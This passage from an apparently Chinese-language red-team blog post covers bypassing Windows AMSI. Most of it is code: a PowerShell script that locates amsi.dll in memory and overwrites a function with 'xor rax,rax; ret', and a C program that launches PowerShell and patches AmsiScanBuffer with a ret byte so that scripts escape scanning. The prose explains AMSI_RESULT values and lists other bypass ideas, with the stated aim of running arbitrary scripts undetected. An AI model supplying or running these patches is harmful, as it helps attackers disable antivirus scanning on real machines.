        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        # Return the address of the function
        return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        Write-Output $TypeBuilder.CreateType()
    }
    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
    $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
    $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
    $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
    $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
    $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
    $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
    $VistualProtectDelegate =  Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)
    If ([IntPtr]::Size -eq 8) {
        Write-Host "[+] 64-bits process"
        [byte[]]$egg = [byte[]] (
            0x4C, 0x8B, 0xDC,       # mov     r11,rsp
            0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
            0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
            0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
            0x57,                   # push    rdi
            0x41, 0x56,             # push    r14
            0x41, 0x57,             # push    r15
            0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
        )
    } Else {
        Write-Host "[+] 32-bits process"
        [byte[]]$egg = [byte[]] (
            0x8B, 0xFF,             # mov     edi,edi
            0x55,                   # push    ebp
            0x8B, 0xEC,             # mov     ebp,esp
            0x83, 0xEC, 0x18,       # sub     esp,18h
            0x53,                   # push    ebx
            0x56                    # push    esi
        )
    }
    $hModule = $LoadLibrary.Invoke("amsi.dll")
    Write-Host "[+] AMSI DLL Handle: $hModule"
    $DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, "DllGetClassObject")
    Write-Host "[+] DllGetClassObject address: $DllGetClassObjectAddress"
    [IntPtr]$targetedAddress = [Hunter]::FindAddress($DllGetClassObjectAddress, $egg)
    Write-Host "[+] Targeted address: $targetedAddress"
    $oldProtectionBuffer = 0
    $VirtualProtect.Invoke($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null
    $patch = [byte[]] (
        0x31, 0xC0,    # xor rax, rax
        0xC3           # ret  
    )
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
    $a = 0
    $VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
但是这个脚本到现在已经不行了，而且defender是直接报毒的，我在想是不是可以hook一下，改下值就行了。
### 内存补丁
>
> 我们知道字符串是否敏感是由amsi.dll中的AmsiScanBuffer函数来进行判断的，而内存补丁是一种较为便捷的技术，我们可以对这个函数进行修补，使其丧失判断能力，这样我们就能自由执行任意powershell脚本，当然前提是脚本文件没有被杀软干掉。
上面的方式通过将AmsiScanBuffer的第三个参数长度改为0，我感觉也可以归为内存补丁的一种。
通过上面对AmsiScanBuffer的介绍，应该知道了该函数返回HRESULT类型值，这是一个整数值，用来表示操作是否成功。如果该函数成功，那么就应当返回S_OK（0x00000000），否则应该返回HRESULT错误代码。
AmsiScanBuffer最后一个参数为AMSI_RESULT
结构为
    typedef enum AMSI_RESULT {  AMSI_RESULT_CLEAN,  AMSI_RESULT_NOT_DETECTED,  AMSI_RESULT_BLOCKED_BY_ADMIN_START,  AMSI_RESULT_BLOCKED_BY_ADMIN_END,  AMSI_RESULT_DETECTED} ;
大概就是通过这个结构体去返回是否认定被检测的内容是否的恶意的，数值越大风险越高。
方法应该挺多的，可以注入一个dll到powershell这样去hook或者什么操作，也可以直接起一个powershell进程然后获取`AmsiScanBuffer`的函数地址，让他直接函数返回啊这些操作，这个方法的重点应该是免杀性。
偷个懒：
    #include 
    #include 
    int main() {
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        CreateProcessA(NULL, (LPSTR)"powershell -NoExit dir", NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi);
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        Sleep(500);
        DWORD oldProtect;
        char patch = 0xc3;
        VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
        WriteProcessMemory(pi.hProcess, (LPVOID)pAmsiScanBuffer, &patch, sizeof(char), NULL);
        VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, oldProtect, NULL);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        FreeLibrary(hAmsi);
        return 0;
    }
0xc3的硬编码对应的汇编是ret，也就是调用AmsiScanBuffer直接让他返回。这个马是直接被杀的。
还有一些如com劫持，NULL字符绕过的办法已经失效了，这里作为初探就不去研究了。
## 参考
《Bypass AMSI的前世今生》by LN
最后欢迎关注团队公众号：红队蓝军